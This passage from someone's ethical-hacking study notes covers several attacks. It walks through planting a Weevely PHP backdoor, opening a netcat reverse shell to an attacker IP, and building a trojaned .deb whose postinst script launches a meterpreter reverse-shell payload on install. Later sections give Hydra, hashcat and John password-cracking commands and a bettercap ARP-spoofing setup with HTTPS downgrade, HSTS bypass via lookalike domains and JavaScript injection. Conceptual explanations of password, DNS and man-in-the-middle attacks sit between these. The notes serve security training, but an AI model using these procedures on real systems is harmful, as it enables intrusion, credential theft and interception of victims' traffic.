generated](media/image440.png){width="6.5in"
height="3.254861111111111in"}

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5308702#content>

![Text Description automatically
generated](media/image441.png){width="6.5in"
height="2.3201388888888888in"}

#### RubberDucky from Hak5 (pre-programmed reverse shell dongle)

**Tutorial**: <https://www.youtube.com/watch?v=A2JNBpUotZM>

#### Weevley (php backdoor)

<https://www.youtube.com/watch?v=Ig-HS6kxz4Q>

![Text Description automatically generated with medium
confidence](media/image442.png){width="6.5in"
height="3.0069444444444446in"}

Software that generates malicious scripts (like a php script) which can
be used to creates a backdoor on a vulnerable system. Ideal for
uploading as a file through a webpage where possible.

Note: all commands here run on hacking machine.

Use the **help** command to see all custom weevley commands.

**Creating a backdoor payload (script)**:

weevley generate \<backdoor_password\> \<pathtosaveto\>

![](media/image443.png){width="6.5in" height="0.3548611111111111in"}

**Execute a file upload exploit and upload the malicious file**

Example: This will upload the file on a web app to
\<host\>/dvwa/hackable/uploads

Here we are uploading shell.php

Try navigating to the file in the browser -- no errors is a good sign
that the file is uploaded.

![Graphical user interface, application Description automatically
generated](media/image444.png){width="5.490349956255468in"
height="0.7084317585301837in"}

**Connecting to backdoor:**

weevley \<url/filepath\> \<password\>

![Text Description automatically
generated](media/image445.png){width="6.5in"
height="1.8868055555555556in"}

At this point you can run linux commands on the remote machine!

![Text Description automatically
generated](media/image446.png){width="6.5in"
height="1.4090277777777778in"}

#### Opening a reverse shell with netcat

**On Hacking machine**

nc -vv -l -p \<hacker_PORT\>

![](media/image447.png){width="6.5in" height="1.3055555555555556in"}

**On victim machine**

nc e /bin/bash \<hacker_IP\> \<hacker_PORT\>

For example, in command injection:![](media/image448.png){width="6.5in"
height="2.234027777777778in"}

Requires older version of netcat

![](media/image449.png){width="6.0737642169728785in"
height="1.1043208661417323in"}

### Trojans (Creating and deploying)

**Optional setup**

mkdir -p \~/Desktop/Malware/trojans && cd \~/Desktop/Malware/trojans

**Choose an installer to modify and download it (kali - debian)**

sudo apt download alpine

\^ this download a dpkg

#### Extract the exe contents into a file

*Install engrampa archive manager*

sudo apt update && sudo apt install engrampa -y

*Extract .deb file contents*

engrampa \<filename\> -e \<folder_to_extract_into\>

\^ this requires a GUI -- if not it will thrown an error.

![A screenshot of a computer Description automatically generated with
medium confidence](media/image450.png){width="6.5in"
height="0.8458333333333333in"}

![Text Description automatically
generated](media/image451.png){width="4.3964468503937in"
height="1.1043208661417323in"}

\^ Along with the installation folder ("DEB") you'll have some folders
(like "usr") which will be copied to the relative home directories when
installing the program. For example, upon installation, the "usr" folder
(and it contents) will be copied to /home/usr. We will save our
malicious file in usr/bin later.

#### Creating/Implanting your malicious file

*Create reverse payload shell using Msfvenom*

[Format]{.underline}

msfvenom -a \<architecture\> ---platform \<windows\|linux\> -p
\<payload\> LHOST=\<listening_host\> LPORT=\<listening_port\> -b "\\x00"
-f \<exe\|elf\> -o \<exe_name\>

[Example]{.underline}

msfvenom -a x86 ---platform linux -p linux/x86/meterpreter/reverse_tcp
LHOST=\<kali_ip\> LPORT=8443 -b "\\x00" -f elf -o malicious

![](media/image452.png){width="6.5in" height="1.417361111111111in"}

Copy your malicious file to the usr/bin

cp malicious usr/bin

![](media/image453.png){width="5.1882239720035in"
height="1.5627176290463691in"}

**Troubleshooting: Creating a payload**

If you have an encoding error -- try explicitly specifying your encoder.

See encoders with: msfvenom --list encoders

Try using this one if you hit an error

![](media/image454.png){width="1.8335892388451445in"
height="0.33338035870516186in"}

Make sure the right arch/payload combination is selected...

View payloads: msfvenom --list payloads

View archs: msfvenom \--list archs

![Text Description automatically
generated](media/image455.png){width="4.490209973753281in"
height="6.5946708223972in"}

![](media/image455.png){width="4.490209973753281in"
height="6.5946708223972in"}

#### Editing your DEB files

![](media/image456.png){width="4.177666229221347in"
height="1.0418121172353456in"}

-   **control**: This file holds information about the package.

-   **md5sums**: Used to verify file integrity after installation.

-   **preint**: In Debian system -- used tell installer what to do
    before installing. Create if it doesn't exist (optional).

-   **postint**: In Debian system -- used tell installer what to do
    after installing. Create if it doesn't exist.

*Edit your postint file -- make it a shell script to run the malicious
payload*

======================================================

#!/bin/sh

sudo chmod 2755 /usr/bin/malicious &

sudo ./usr/bin/malicious &

exit 0

======================================================

\^ Point to the malicious file that you created earlier.

Make sure postint file is executable

chmod +x \~/desk

#### Compiling and listening

**Compile your exe into a .deb file**

dpkg-deb ---build \<path_to_exe_files\>

Example:

dpkg-deb ---build \~/Desktop/Malware/trojans/mailTrojan

Now you can host this file so someone can download.

python -m http.server 8080

**Listening for incoming connections**

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD
linux/x86/meterpreter/reverse_tcp; set LHOST \<kali_ip\>; set LPORT
\<kali_port; run; exit -y\>

s

### Password Attacks

#### Types of Brute-Force Password Attacks

There is no getting around it, passwords are the most secure common
safeguards we have to prevent unauthorized account access.
Unfortunately, our passwords may not be as secure or strong as they
should be. A common attack that occurs to gain access to an account is a
password attack. Password attacks utilize software like password
crackers that try and guess your password.

##### Simple Brute-force

A common password attack is a **brute force attack**, which just
continuously tries different combinations of characters and letters
until it gets access. Since this attack requires testing a lot of
combinations of passwords, it usually takes a while to do this. Have you
ever seen a CAPTCHA when logging into a website? CAPTCHAs are used to
distinguish a real human from a machine. They ask things like, are you
human, or are you a robot, or are you a dancer? In a password attack, if
you didn\'t have a CAPTCHA available, an automated system can just keep
trying to log into your account until it found the right password
combination. But with a CAPTCHA, it prevents these attacks from
executing.

##### Dictionary (wordlist)

Another type of password attack is a **dictionary attack**. A dictionary
attack doesn\'t test out brute force combinations like ABC1 or capital
ABC1. Instead, it tries out words that are commonly used in passwords,
like password, monkey, football. The best way to prevent a password
attack is to utilize strong passwords. Don\'t include real words you
would find in a dictionary and make sure to use a mix of capitals,
letters, and symbols. Without any fail-safes like CAPTCHAs or other
account protections, it would take a typical password cracker
application about one minute to crack a password like sandwich. But
substantially longer to crack something like what you see here, spelled
s, &, n, capital D, w, h, number 1, c, then another h. See how that\'s
the same but also way harder to crack?

##### *Reverse brute force attacks*

***Reverse brute force attacks*** are similar to dictionary attacks,
except they start with a single credential and try it in various systems
until a match is found.

##### *Credential stuffing*

*Credential stuffing* is a tactic in which attackers use stolen login
credentials from previous data breaches to access user accounts at
another organization. A specialized type of credential stuffing is
called *pass the hash*. These attacks reuse stolen, unsalted hashed
credentials to trick an authentication system into creating a new
authenticated user session on the network.

##### Rainbow Tables

That brings us to the topic of **rainbow tables**. Don\'t be fooled by
the colorful name. These tables are used by bad actors to help speed up
the process of recovering passwords from stolen password hashes. A
rainbow table is just a pre-computed table of all possible password
values and their corresponding hashes. The idea behind rainbow table
attacks is to trade computational power for disk space by pre-computing
the hashes and storing them in a table. An attacker can determine what
the corresponding password is for a given hash by just looking up the
hash in their rainbow table.

![A picture containing table Description automatically
generated](media/image457.png){width="6.5in"
height="4.795138888888889in"}

This is unlike a brute force attack where the hash is computed for each
guess attempt. It\'s possible to download rainbow tables from the
internet for popular password lists and hashing functions. This further
reduces the need for computational resources requiring large amounts of
storage space to keep all the password and hash data. You may be
wondering how you can protect against these pre-computed rainbow tables.
That\'s where salts come into play. And no, I\'m not talking about table
salt. A password salt is additional randomized data that\'s added into
the hashing function to generate the hash that\'s unique to the password
and salt combination. Here\'s how it works. A randomly chosen large salt
is concatenated or tacked onto the end of the password. The combination
of salt and password is then run through the hashing function to
generate hash which is then stored alongside the salt. What this means
now for an attacker is that they\'d have to compute a rainbow table for
each possible salt value. If a large salt is used, the computational and
storage requirements to generate useful rainbow tables becomes almost
unfeasible.

#### Brute Force and Dictionary Attacks (Password/Hash cracking)

These are some common brute forcing tools:

-   Aircrack-ng

-   Hashcat 

-   John the Ripper

-   Ophcrack

-   THC Hydra

##### Creating a wordlist (using crunch)

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6021338#overview>

![A screenshot of a computer Description automatically generated with
medium confidence](media/image458.png){width="6.5in"
height="3.0548611111111112in"}

\^ the "I wordlist" in the pic should be an "-o" for output.

Use the "@" to mean "all possible characters" -- meaning any character
can take that place.

##### Wordlist resources

<https://github.com/danielmiessler/SecLists>

<https://weakpass.com/wordlist>

<https://github.com/berzerk0/Probable-Wordlists>

<http://www.openwall.com/mirrors/>

<http://www.outpost9.com/files/WordLists.html>

<http://www.vulnerabilityassessment.co.uk/passwords.htm>

<http://packetstormsecurity.org/Crackers/wordlists/>

<http://www.ai.uga.edu/ftplib/natural-language/moby/>

<http://wordlist.sourceforge.net/>

<ftp://ftp.openwall.com/pub/wordlists/>

##### THC Hydra cracking

![A picture containing text, font, graphic design, screenshot
Description automatically generated](media/image459.png){width="6.5in"
height="3.2868055555555555in"}

Use --L flag to specify a wordlist of usernames

![Graphical user interface, text Description automatically generated
with medium confidence](media/image460.png){width="6.5in"
height="0.9840277777777777in"}

Or use a lowercase '-l' if you alreadyknow the username

![A screenshot of a computer Description automatically generated with
medium confidence](media/image461.png){width="6.5in"
height="1.0020833333333334in"}

Then use '**-P**' flag for password word list or a lowercase "p" (-p) to
specify a single password you want to try.

![Text Description automatically
generated](media/image462.png){width="6.5in"
height="0.9319444444444445in"}

**Supported Services**

Hydra's man page has a section of "Supported Services" which outline the
argument to pass in for a given service type.

###### Hydra dictionary attack on ssh

hydra \<host\> ssh -L \<usernamelist\> -P \<passwordlist\>

![Text Description automatically
generated](media/image463.png){width="6.5in"
height="2.2756944444444445in"}

My vm (fail2ban initially blocked blocked this after the 5^th^ attempt)

![Graphical user interface, text Description automatically
generated](media/image464.png){width="6.5in"
height="1.7402777777777778in"}

###### Hydra attack on login page

**un** -- fill this in with the input name of the username field

**pw** -- fill this in with the input name of the password field

**fm** -- fill this is with the input name of the submit button.

**Form Simple**

hydra \<host\> \<type\> "path:query:failmsg" -L \<usernamelist\> -P
\<passlist\>

**Form Full**

hydra host type "path:un=\^USER\^&pw=\^PASS\^&fm=submit:failmsg" -L
\<wordlist_users\> -P \<wordlist_passwords\>

\^ "failmsg" is the message that appears on screen when a failed login
attempt occurs. Hydra will scan for this to know whether the attempt was
successful or not.

**Example**

hydra 192.168.1.11 http-form-post
"/bWAPP/login.php:login=\^USER\^&password=\^PASS\^&form=submit:Invalid
credentials or user not activated" -L users.txt -P passwords.txt

\^ Can get the actual request from Chrome DevTools network tab or from
Burp suite.

**Note**: Notice (above) after the final caret "\^" where we plug in the
password -- we still must add in the rest of the url that is part of a
particular request.

![](media/image465.png){width="6.5in" height="0.38958333333333334in"}

![Diagram Description automatically generated with medium
confidence](media/image466.png){width="6.5in" height="1.625in"}

![](media/image467.png){width="6.5in" height="0.5958333333333333in"}

**Note on the "incorrectmessage".** After the colon you can specify the
message you're looking for (fail message by default).

The "F" can be used to pass in the fail message or the "P" can be used
to add in the success message (if any).

![](media/image468.png){width="6.5in" height="0.4875in"}

![Graphical user interface, application Description automatically
generated](media/image469.png){width="3.709050743657043in"
height="2.526988188976378in"}

##### Hashcat :Installing/Using \[brute force and dictionary\]

<https://www.youtube.com/watch?v=EfqJCKWtGiU>

<https://linuxhint.com/hashcat-tutorial/>

<https://online-it.nu/how-to-crack-wpa-wpa2-hash-using-hashcat/>

**Basic usage**

![](media/image470.png){width="6.5in" height="0.47152777777777777in"}

.\\hashcat.exe -m 3200 \'\$2a\$06\$7yoU3Ng8dHTXp...\' .\\rockyou.txt

You can display the cracked password with the "show" command or by
running the same command again, all cracked hashes will be stored in the
"hashcat.potfile" in the hashcat folder.

**Helpful Links**

-   Pcap to hccapx convert (file upload)

    -   <https://hashcat.net/cap2hashcat/>

-   Hashcat executables

    -   <https://github.com/hashcat/hashcat>

-   Hashcat modes

    -   <https://hashcat.net/wiki/doku.php?id=example_hashes>

-   Download pcap to hccapx executables

    -   <https://github.com/hashcat/hashcat-utils/releases>

-   Wordlists

    -   <https://weakpass.com/wordlist>

    -   

Kali has the rockyou wordlist stored bydefault

![](media/image471.png){width="6.5in" height="0.6541666666666667in"}

###### \[Windows\] Pcap tp hccapx files

=== pcap to hccapx windows

Tutorial: <https://youtu.be/_jzZ875KC5M>

<https://github.com/hashcat/hashcat-utils/releases>

=== dir structure

dir\\

-\> pcap-covert.ps1

-\> cap2hccapx.exe

-\> merged\\

1.  Create dir

2.  Create Powershell script and place in working dir

    a.  <https://pastebin.com/crWJ5PF4>

3.  Download cap2hccapx.exe and place in working dir

    a.  <https://github.com/hashcat/hashcat-utils/releases>

    b.  <https://github.com/hashcat/hashcat-utils/releases/download/v1.9/hashcat-utils-1.9.7z>

    c.  curl -O
        https://github.com/hashcat/hashcat-utils/releases/download/v1.9/hashcat-utils-1.9.7z

4.  Place any pcap files in working dir

5.  Command to run in cmd: powershell -ExecutionPolicy ByPass -File
    .\\pcap-convert.ps1

    a.  individual hccapx files will exists in working dir and the sum
        of all will be placed in merged folder named multi.2500 (This is
        our \"multli file\" - where the number is the mode the file
        needs to run in hascat as denoted by the \"m\" flag when running
        in hashcat.

    b.  Any files with issues will be placed in the incomplete.txt file

6.  Download Hashcat binaries

    a.  <https://hashcat.net/hashcat/>

    b.  Unzip binaries and cd into dir where hashcat.exe file is

    c.  Copy your newly created \"multi file\" (multi.2500) into the for
        where hashcat.exe is

7.  While in dir where hashcat.exe is\... copy a wordlist - for example
    \"rockyou.txt\"

8.  Run in hashcat dir via cmd

    a.  hashcat.exe -m 2500 multi.2500 rockyou.txt

    b.  Note above we are specifying the \"rockyou\" dictionary

**Rockyou wordlist \[MAGNET\]**:
<https://chris.partridge.tech/2021/rockyou2021.txt-a-short-summary/#download>

**Rockyou wordlist \[ZIP\]**:
<https://mega.nz/folder/aDpmxCiD#f_pSJ0vV698-Ev1mbyYNAQ>

**HashCat Tutorial:**

<https://linuxhint.com/hashcat-tutorial/>

<https://online-it.nu/how-to-crack-wpa-wpa2-hash-using-hashcat/>

![A screenshot of a computer Description automatically generated with
medium confidence](media/image472.png){width="6.5in"
height="0.8652777777777778in"}

**[Troubleshooting:]{.underline}**

-   Drivers may be required

    -   AMD:
        <https://www.guru3d.com/files-details/amd-radeon-adrenalin-21-10-1-driver-download,6.html>

    -   

<https://github.com/xfox64x?tab=repositories>

##### Cain & Abel \[brute force and dictionary\]

![Text Description automatically
generated](media/image473.png){width="6.5in"
height="2.6319444444444446in"}

Also used to perform MIM attacks on RDP sessions on systems that used
self-signed certs.

##### Aircrack-ng (CPU-Only)

**Using aircrack-ng and a wordlist**

*Form*

aircrack-ng \<capture_file\> -w \<wordlist\>

*Example:*

aircrack-ng wpa_handshakes.cap -w wordlist.txt

![Text Description automatically
generated](media/image474.png){width="6.5in"
height="2.1777777777777776in"}

##### John the ripper

![](media/image475.png){width="2.663338801399825in"
height="0.41172134733158355in"}

###### Cracking linux password

**Steps 1: Unshadow passwords**

![Graphical user interface, text, application Description automatically
generated](media/image476.png){width="4.243273184601925in"
height="0.49059055118110234in"}

![](media/image477.png){width="2.250115923009624in"
height="0.2569575678040245in"}

![](media/image478.png){width="6.5in" height="0.5368055555555555in"}

**Step 2 : Crack and show pass**

*Single-crack mode (default)*

jonn \<passwords.txt\>

![Text Description automatically
generated](media/image479.png){width="6.5in"
height="2.1319444444444446in"}

Note: In this mode, john will try to crack the password using the
login/GECOS information as passwords.

*Wordlist mode*

jonn -wordlist:\<wordlist.txt\> \<passwords.txt\>

*Incremental mode*

jonn -incremental:ALL \<passwords.txt\>

![](media/image480.png){width="6.5in" height="0.48680555555555555in"}

This is the most powerful mode. John will try any character combination
to resolve the password. Details about these modes can be found in the
MODES file in john\'s documentation, including how to define your own
cracking methods.

##### OPHCrack

### Network Attacks

#### Changing your network information

##### MAC Spoofing

**[Using the ip command]{.underline}**

![Text Description automatically generated with medium
confidence](media/image481.png){width="2.4521369203849517in"
height="0.6321194225721785in"}

![Graphical user interface, text Description automatically
generated](media/image482.png){width="2.892087707786527in"
height="0.6127143482064742in"}

![Text Description automatically generated with medium
confidence](media/image483.png){width="2.5684350393700788in"
height="0.581078302712161in"}

*Note: blue fields are to be updated with real info.*

**[Using ifconfig command]{.underline}**

1.  Ifconfig has a 'down' option which can be used to temportarily
    disable the interface

2.  change mac address (hardware address - hwadr)

    a.  MAC addr must begin with "00"?

3.  finally, bring the interface back up.

**Format**:

ifconfig \<interface\> down

ifconfig \<interface\> hw ether \<spoofed MAC addr\>

ifconfig \<interface\> up

**Example**:

ifconfig eth0 down

ifconfig eth0 hw ether 00:11:22:33:44:55

ifconfig eth0 up

*Then run ifconfig to verify changes*

*Note: MAC address changes back to original one after a restart -- this
is only a temporary change.*

*Note: "ether" is used to refer to MAC address in ifconfig*

![Text Description automatically
generated](media/image484.png){width="6.5in"
height="3.832638888888889in"}

After...

![Text Description automatically
generated](media/image485.png){width="6.5in"
height="4.104861111111111in"}

##### Changing your local ip address

**Format**: ifconfig \<interface\> \<ip\>

**Example**: ifconfig eth0 192.168.181.115

##### Changing your Netmask and Broadacast address

**Format**: ifconfig \<interface\> \<ip\> netmask \<mask\> broadcast
\<broadcast addr\>

**Example**: ifconfig eth0 \<192.168.181.115\> netmask 255.255.0.0
broadcast 192.168.1.255

##### Acquiring an DHCP-assigned ip (kali/debian-based)

**Format**: dhclient \<interface\>

**Example**: dhclient eth0

*Then run ifconfig to verify changes*

This action performs a DHCPDISOVER request to the DHCP server and the
DHCP sever esponds with an DHCPOFFER supplying the specified interface
with a local ip, netmask, and broadcast addres.

#### DNS Cache Poisoning attack.

**DNS Cache Poisoning attack.** You probably remember from the bits and
bytes of computer networking course, that DNS works by getting
information about IP addresses and names to make it easier for you to
find a website. A DNS Cache Poisoning attack works by tricking a DNS
server into accepting a fake DNS record that will point you to a
compromised DNS server. It then feeds you fake DNS addresses when you
try to access legitimate websites. Not only that, DNS Cache Poisoning
can spread to other networks too. If other DNS servers are getting their
DNS information from a compromised server, they\'ll serve those bad DNS
entries to other hosts. Several years ago, there was a large scale DNS
Cache Poisoning attack in Brazil. It appeared that attackers managed to
poison the DNS cache of some local ISPs, by inserting fake DNS records
for various popular websites like Google, Gmail, or Hotmail. When
someone attempted to visit one of those sites, they were served a fake
DNS record and were sent to a server that the attacker controlled, which
hosted a small java applet. The user would then be tricked into
installing the applet, which was actually a malicious banking trojan
designed to steal banking credentials. This is an example of the real
world damage DNS Cache Poisoning attacks can pose. You can learn more
about it in the next supplementary reading.

![Graphical user interface, text, application, email, Teams Description
automatically generated](media/image486.png){width="6.5in"
height="4.345138888888889in"}

#### Man-in-the-middle attack

A **man-in-the-middle attack**, is an attack that places the attacker in
the middle of two hosts that think they\'re communicating directly with
each other. It\'s clearly a name that needs some updating, men aren\'t
the only hackers out there. The attack will monitor the information
going to and from these hosts, and potentially modify it in transit. A
common man-in-the-middle attack is a session hijacking or cookie
hijacking. Let\'s say you log into a website and forget to log out. Now,
you\'ve already authenticated yourself to the website and generated a
session token that grants you access to that website. If someone was
performing a session hijacking, they could steal that token and
impersonate you on the website, and no one wants that. This is another
reason to think about the CIA\'s of security, you always want to make
sure that the data that you are sending or receiving has integrity and
isn\'t being tampered with. Another way a man-in-the-middle attack can
be established is a rogue access point attack.

*Summary*

A man-in-the-middle attack (MITM) is an attack where the attacker
secretly relays and possibly alters the communications between two
parties who believe they are directly communicating with each other. One
example of a MITM attack is active eavesdropping, in which the attacker
makes independent connections with the victims and relays messages
between them to make them believe they are talking directly to each
other over a private connection, when in fact the entire conversation is
controlled by the attacker. The attacker must be able to intercept all
relevant messages passing between them.

![Graphical user interface, text, application, Teams Description
automatically generated](media/image487.png){width="6.5in"
height="4.961805555555555in"}

##### IP Spoofing

-   An **[on-path attack]{.underline}** is an attack where the malicious
    actor places themselves in the middle of an authorized connection
    and intercepts or alters the data in transit. On-path attackers gain
    access to the network and put themselves between two devices, like a
    web browser and a web server. Then they sniff the packet information
    to learn the IP and MAC addresses to devices that are communicating
    with each other. After they have this information, they can pretend
    to be either of these devices.

-   Another type of attack is a **[replay attack]{.underline}**. A
    replay attack is a network attack performed when a malicious actor
    intercepts a data packet in transit and delays it or repeats it at
    another time. A delayed packet can cause connection issues between
    target computers, or a malicious actor may take a network
    transmission that was sent by an authorized user and repeat it at a
    later time to impersonate the authorized user.

-   A **[smurf attack]{.underline}** is a combination of a DDoS attack
    and an IP spoofing attack. The attacker sniffs an authorized user\'s
    IP address and floods it with packets. This overwhelms the target
    computer and can bring down a server or the entire network.

###### On-path attack

An **on-path attack** happens when a hacker intercepts the communication
between two devices or servers that have a trusted relationship. The
transmission between these two trusted network devices could contain
valuable information like usernames and passwords that the malicious
actor can collect. An on-path attack is sometimes referred to as a
**meddler-in-the middle attack** because the hacker is hiding in the
middle of communications between two trusted parties.

Or, it could be that the intercepted transmission contains a DNS system
look-up. You'll recall from an earlier video that a DNS server
translates website domain names into IP addresses. If a malicious actor
intercepts a transmission containing a DNS lookup, they could spoof the
DNS response from the server and redirect a domain name to a different
IP address, perhaps one that contains malicious code or other threats.
The most important way to protect against an on-path attack is to
encrypt your data in transit, e.g. using TLS.

###### Smurf attack

A **smurf attack** is a network attack that is performed when an
attacker sniffs an authorized user's IP address and floods it with
packets. Once the spoofed packet reaches the broadcast address, it is
sent to all of the devices and servers on the network. 

In a smurf attack, IP spoofing is combined with another denial of
service (DoS) technique to flood the network with unwanted traffic. For
example, the spoofed packet could include an Internet Control Message
Protocol (ICMP) ping. As you learned earlier, ICMP is used to
troubleshoot a network. But if too many ICMP messages are transmitted,
the ICMP echo responses overwhelm the servers on the network and they
shut down. This creates a denial of service and can bring an
organization's operations to a halt.

An important way to protect against a smurf attack is to use an advanced
firewall that can monitor any unusual traffic on the network. Most next
generation firewalls (NGFW) include features that detect network
anomalies to ensure that oversized broadcasts are detected before they
have a chance to bring down the network.

###### DoS attack

As you've learned, once the malicious actor has sniffed the network
traffic, they can impersonate an authorized user. A **Denial of Service
attack** is a class of attacks where the attacker prevents the
compromised system from performing legitimate activity or responding to
legitimate traffic. Unlike IP spoofing, however, the attacker will not
receive a response from the targeted host. Everything about the data
packet is authorized including the IP address in the header of the
packet. In IP spoofing attacks, the malicious actor uses IP packets
containing fake IP addresses. The attackers keep sending IP packets
containing fake IP addresses until the network server crashes.

**Pro Tip**: Remember the principle of defense-in-depth. There isn't one
perfect strategy for stopping each kind of attack. You can layer your
defense by using multiple strategies. In this case, using industry
standard encryption will strengthen your security and help you defend
from DoS attacks on more than one level. 

##### ARP Spoofing

###### ARP Spoofing with Ettercap (gui)

**Install:** sudo apt install ettercap

Make sure you have port-forwarding enabled first.

sudo sysctl -w net.ipv4.ip_forward=1

or... (run as root)

echo 1 \> /proc/sys/net/ipv4/ip_forward

###### ARP Spoofing with bettercap

<https://www.youtube.com/watch?v=UvRXJZVMxaI>

Might have to install bettercap first on kali

sudo apt install bettercap

####### Create spoofing script (caplet) \[preferred\]

This single script runs all commands below (steps 1-5) -- just plug in
the proper ips/macs

net.probe on

net.recon on

set arp.spopof.fullduplex true

set arp.spoof.targets \<target ip/mac\>

arp.spoof on

net.sniff on

Save as a file "spoof.cap" for example. (must be saved ending in "cap")

Then start bettercap with this script:

bettercap -iface \<interface\> -caplet spoof.cap

####### 1. Start bettercap

![](media/image488.png){width="6.5in" height="2.7534722222222223in"}

![Logo Description automatically generated with medium
confidence](media/image489.png){width="6.5in"
height="0.8590277777777777in"}

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/14600706#announcements>

####### 2. Help menu and probing for devices

Run 'help' at any time to all/running modules.

To get information on a module type "help" and the module name.

Example: help arp.spoof

**Net probe**

The net probe command is useful for finding other devices on your LAN.
It includes their IP and MAC (just like discover).

![](media/image490.png){width="6.5in" height="1.3791666666666667in"}

Net probe starts net.recon and net.recon allows you to enter the
net.show command which gives a nice formatted list

![A screenshot of a computer Description automatically generated with
medium confidence](media/image491.png){width="6.5in"
height="1.582638888888889in"}

####### 3. Spoofing with bettercap

Enable the fullduplex parameter:

set arp.spoof.fullduplex true

Set targets to spoof with targets parameter

set arp.spoof.targets \<Ips or MACs\>

Start spoofing

arp.spoof on

####### 4. Capturing traffic with bettercap

Use the **net.sniff** module.

net.sniff on

s

####### Using bettercap web ui

Once bettercap is started, you can install the web UI with ui.update

Then you can start the web UI with http-ui.

You will be presented with a login screen in stdout localhost:8080

**Default creds:**

User: user

Pass: pass

More here: <https://www.bettercap.org/usage/webui/>

You can also start bettercap web ui directly from terminal with

sudo bettercap -caplet http-ui

####### Bypassing HTTPS

We can only sniff data that's in plain text -- that's where https
becomes a problem.

Bettercap has a caplet that downgrades requests from https to http to
sort that.,

######## Enabling local sniffing

Add set **net.sniff.local true** -- this tells bettercap to sniff all
data -- even local data (meaning -- even the traffic from your
attackbox). We want to sniff this since we will be downgrading to http
on our attackbox and this is where we would sniff the plain text data.

If we're using a spoofing script, the new script should looks like this:

net.probe on

net.recon on

set arp.spoof.fullduplex true

set arp.spoof.targets \<target ip/mac\>

arp.spoof on

set net.sniff.local true

net.sniff on

add the following to output captured traffic to a file

set net.sniff.output mycapture.cap

######## Enable HTTPS downgrade caplet

Start bettercap without spoof script

![](media/image492.png){width="2.6670384951881014in"
height="0.3229615048118985in"}

Show all caplets with caplets.show (may need to run caplets.update
first)

![Text Description automatically
generated](media/image493.png){width="6.5in"
height="4.698611111111111in"}

![Text Description automatically
generated](media/image494.png){width="6.5in"
height="1.8215277777777779in"}

Load a caplet by typing the caplet name -- we want **hstshijack** caplet

![](media/image495.png){width="4.917352362204724in"
height="0.41672462817147854in"}

Then run bettercap with the script

![Text Description automatically
generated](media/image496.png){width="6.5in"
height="1.5263888888888888in"}

Now as users make requests -- they will be given HTTP sities and you can
see the data

![Text Description automatically
generated](media/image497.png){width="6.5in"
height="3.953472222222222in"}

Note: You can start a bettercap sessions with more than one caplet

![](media/image498.png){width="6.5in" height="0.41388888888888886in"}

####### Bypassing HSTS

![Graphical user interface, website Description automatically
generated](media/image499.png){width="6.5in"
height="3.317361111111111in"}

**Edit the hstshijack caplet**

nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap

![Text Description automatically
generated](media/image500.png){width="6.5in"
height="2.186111111111111in"}

Things you would want to replace are the targets and the replacements

![Graphical user interface, text Description automatically
generated](media/image501.png){width="6.5in"
height="2.7402777777777776in"}

**Targets** and **replacements** Should look like this...

set hstshijack.targets
twitter.com,\*.twitter.com,facebook.com,\*.facebook.com,instagram.com,\*.instagram.com,google.com,\*.google.com,
gstatic.com, \*.gstatic.com

set hstshijack.replacements
twiter.com,\*.twiter.com,facebook.corn,\*.facebook.corn,instagam.com,\*.instagam.com,google.corn,\*.google.corn,gstatic.corn,\*.gstatic.corn

**dns.spoof.domains**

set dns.spoof.domains
twiter.com,\*.twiter.com,facebook.corn,\*.facebook.corn,instagam.com,\*.instagam.com,google.corn,\*.google.corn,gstatic.corn,\*.gstatic.corn

####### Injecting javascript code into response

Open/edit hstshijack file

nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap

Add a new payload

-   **Form:** \<domains\>:\<path_to_js\>

-   **Form:** mysite.com:mypayload.js

-   "\*" -- means every domain. Can be replaced with actual domain
    names.

![A screenshot of a computer Description automatically generated with
low confidence](media/image502.png){width="4.5006277340332455in"
height="0.9688856080489939in"}

![Text Description automatically
generated](media/image503.png){width="6.5in"
height="2.6708333333333334in"}

####### Caplets and bettercap

Caplets are saved in **/usr/local/share/bettercap/caplets**

![A screenshot of a computer Description automatically generated with
medium confidence](media/image504.png){width="5.042369860017498in"
height="2.427422353455818in"}

###### ARP spoofing/poisoning using arpspoof

With ARP spoofing we can perform a MIM attack with two spoofs.

-   **Intercept outgoing traffic from a victim**

    -   Spoof our MAC address to make the victim think we (hacker) are
        the router.

    -   Receive packets and copy to ourselves for inspection.

    -   Pass original packets on to actual router.

-   **Intercept ingoing traffic from a victim**

    -   Spoof our MAC address to make the router think we (hacker) are
        the victim.

    -   Receive packets and copy to ourselves for inspection.

    -   Pass original packets on to victim.

####### Step 1: Scan for MAC addresses on the LAN

-   Install dsniff (on hacking machine)

    -   sudo apt update && sudo apt install dsniff -y

-   scan for MACs on the LAN

    -   sudo netdiscover

    -   *Install netdiscover if needed*

-   *(optional) view current arp table on router/victim machines (if
    you're testing) -- see which MAC is saved*

    -   sudo arp -a

####### Step 2: Enable port-forwarding (on hacking machine)

**Check if ip forwarding is enabled**

sysctl net.ipv4.ip_forward

or

cat /proc/sys/net/ipv4/ip_forward

![A screenshot of a computer Description automatically generated with
medium confidence](media/image505.png){width="5.240314960629921in"
height="1.3022648731408575in"}

**Enable ip forwarding**

sysctl -w net.ipv4.ip_forward=1

echo 1 \> /proc/sys/net/ipv4/ip_forward

**Disable ip forwarding**

sysctl -w net.ipv4.ip_forward=0

or...

echo 0 \> /proc/sys/net/ipv4/ip_forward

![](media/image506.png){width="6.5in" height="0.24583333333333332in"}

####### Step 3: Spoof!

![](media/image507.png){width="6.5in" height="3.547222222222222in"}

**Preliminary**: make sure step 1 was folllwed and dsniff was installed

sudo apt update && sudo apt install dsniff -y

**Syntax**: arpspoof -i \<interface\> -t \<target_ip\> \<ip_we're
spoofing\>

**Spoof the router** (trick victim into thinking we're the router)

arpspoof -i \<interface\> -t \<victim_ip\> \<default_gateway\>

**Spoof the victim** (trick router into thinking we're the victim)

arpspoof -i \<interface\> -t \<default_gateway\> \<victim_ip\>

***Note***: these two commands cause the terminal to hang so best to
runs as a job or use multiple terminals.

**Using wireshark in hacking machine**

![A screenshot of a computer Description automatically
generated](media/image508.png){width="6.5in"
height="0.8333333333333334in"}

Right-click \> Follow \> TCP stream to see request/response body

####### Step4: Capturing Images with driftnet

To see the images from websites that our victim visits, you need to use
driftnet. Driftnet is a program which listens to network traffic and
picks out images from TCP streams it observes. Fun to run on a host
which sees lots of web traffic. The strucure of the command to start
